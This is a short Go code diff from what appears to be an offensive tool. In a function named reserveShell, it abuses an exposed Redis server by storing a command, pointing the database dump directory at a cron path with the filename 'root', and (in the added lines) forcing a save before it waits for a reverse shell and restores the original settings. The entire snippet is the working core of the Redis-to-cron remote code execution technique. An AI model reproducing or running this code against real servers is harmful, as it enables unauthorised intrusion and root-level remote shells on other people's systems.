@@ -100,6 +100,9 @@ func (h *Hik) reserveShell() {
 	rdb.Set("xxx", h.Cmd, 0)
 	rdb.ConfigSet("dir", cronPath[1])
 	rdb.ConfigSet("dbfilename", "root")
+	rdb.Save()
+	fmt.Println("Waiting For Reverse.......")
+	time.Sleep(5 * time.Second)
 	rdb.ConfigSet("dir", h.redisOriginalDir)
 	rdb.ConfigSet("dbfilename", h.redisOriginalDbFilename)
 }
